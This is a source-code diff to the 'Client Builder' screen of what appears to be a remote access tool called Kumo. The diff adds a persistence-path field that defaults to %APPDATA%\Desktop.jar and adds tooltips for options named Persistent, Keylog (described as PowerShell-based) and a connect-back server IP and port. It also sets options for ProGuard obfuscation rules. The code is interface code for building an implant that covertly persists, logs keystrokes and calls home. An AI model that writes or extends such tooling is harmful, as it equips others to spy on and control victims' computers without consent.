@@ -18,10 +18,8 @@ import javafx.geometry.Insets;
 import javafx.scene.control.Label;
 import javafx.scene.control.TextField;
 import javafx.scene.control.TitledPane;
-import javafx.scene.layout.BorderPane;
-import javafx.scene.layout.GridPane;
-import javafx.scene.layout.HBox;
-import javafx.scene.layout.Priority;
+import javafx.scene.control.Tooltip;
+import javafx.scene.layout.*;
 
 import java.io.IOException;
 
@@ -32,6 +30,7 @@ public class ClientBuilderView {
     private JFXCheckBox debug;
     private JFXTextField jarCreatedBy;
     private JFXTextField jarVersion;
+    private JFXTextField persistencePath;
     private JFXCheckBox createProguardRules;
     private JFXCheckBox keylog;
     private TextField updateTime;
@@ -60,6 +59,14 @@ public class ClientBuilderView {
         // Version
         Label jarVersionLabel = (Label) Styler.styleAdd(new Label("Implementation-Version: "), "label-bright");
         jarVersion = new JFXTextField();
+
+        // Persistence stuff
+        Label persistenceSeparator = (Label) Styler.styleAdd(new Label("\nPersistence:"), "label-bright");
+        persistencePath = new JFXTextField();
+        Label persistencePathLabel = (Label) Styler.styleAdd(new Label("  Persistence Path:"), "label-bright");
+        persistencePath.setTooltip(new Tooltip("If the path is not found on the remote machine, persistence will not be created!\nDefaults to %APPDATA%\\Desktop.jar"));
+
+        // Proguard rules
         Label proguardLabel = (Label) Styler.styleAdd(new Label("Generate proguard rules: "), "label-bright");
         createProguardRules = new JFXCheckBox();
 
@@ -74,8 +81,11 @@ public class ClientBuilderView {
         grid.add(jarCreatedBy, 1, 0);
         grid.add(jarVersionLabel, 0, 1);
         grid.add(jarVersion, 1, 1);
-        grid.add(proguardLabel, 0, 2);
-        grid.add(createProguardRules, 1, 2);
+        grid.add(persistenceSeparator, 0, 2);
+        grid.add(persistencePathLabel, 0, 3);
+        grid.add(persistencePath, 1, 3);
+        grid.add(proguardLabel, 0, 4);
+        grid.add(createProguardRules, 1, 4);
 
         jarSettings.setLayoutY(10);
         jarSettings.setText("JAR Settings");
@@ -110,12 +120,18 @@ public class ClientBuilderView {
         hBox.getStylesheets().add(getClass().getResource(Styler.getCurrentStylesheet()).toExternalForm());
         hBox.setId("clientBuilder");
         hBox.setPadding(new Insets(20, 20, 20, 20));
+        VBox vbox = Styler.vContainer(5);
+        vbox.getStylesheets().add(getClass().getResource(Styler.getCurrentStylesheet()).toExternalForm());
+
         Label title = (Label) Styler.styleAdd(new Label("Client Builder"), "title");
         persistent = new JFXCheckBox("Persistent");
         persistent.setDisableVisualFocus(true);
+        persistent.setTooltip(new Tooltip("Windows & Linux only"));
+
         //autoSpread = new JFXCheckBox("Auto-Spread");
         debug = new JFXCheckBox("Debug Mode");
         keylog = new JFXCheckBox("Keylog");
+        keylog.setTooltip(new Tooltip("Windows only (PSH based)"));
         hBox.getChildren().add(Styler.vContainer(20, title, persistent, debug, keylog)); //autoSpread, debug));
         return hBox;
     }
@@ -125,11 +141,13 @@ public class ClientBuilderView {
         hBox.getStylesheets().add(getClass().getResource(Styler.getCurrentStylesheet()).toExternalForm());
         hBox.setId("clientBuilder");
         hBox.setPadding(new Insets(20, 20, 20, 20));
+
         RequiredFieldValidator fieldValidator = new RequiredFieldValidator("This field is required");
         Label title = (Label) Styler.styleAdd(new Label(" "), "title");
 
         Label serverIPLabel = (Label) Styler.styleAdd(new Label("Server IP: "), "label-bright");
         JFXTextField serverIP = new JFXTextField("" + KumoSettings.CONNECTION_IP);
+        serverIP.setTooltip(new Tooltip("The IP/domain of the connect-back server"));
         serverIP.requestFocus();
         HBox serverIPBox = Styler.hContainer(serverIPLabel, serverIP);
         serverIPBox.setPadding(new Insets(10, 10, 10, 5));
@@ -137,6 +155,7 @@ public class ClientBuilderView {
 
         Label portLabel = (Label) Styler.styleAdd(new Label("Port: "), "label-bright");
         JFXTextField port = new JFXTextField("" + KumoSettings.PORT);
+        port.setTooltip(new Tooltip("The port to connect back on"));
         HBox portBox = Styler.hContainer(portLabel, port);
         portBox.setPadding(new Insets(10, 10, 10, 5));
         port.setEditable(true);
@@ -148,6 +167,7 @@ public class ClientBuilderView {
 
         Label clientNameLabel = (Label) Styler.styleAdd(new Label("Name: "), "label-bright");
         JFXTextField clientName = new JFXTextField("Client");
+        clientName.setTooltip(new Tooltip("The name of the client JAR file (without .jar)"));
         HBox clientNameBox = Styler.hContainer(clientNameLabel, clientName);
         clientNameBox.setPadding(new Insets(10, 0, 10, 0));
         clientName.setEditable(true);
@@ -200,6 +220,9 @@ public class ClientBuilderView {
             }
             if ((!jarVersion.getText().equals(""))){
                 ClientBuilder.jarVersion = jarVersion.getText();
+            }
+            if (!persistencePath.getText().equals("")){
+                ClientBuilder.persistencePath = persistencePath.getText();
             }
             if (createProguardRules.isSelected()){
                 ClientBuilder.createProguard = true;
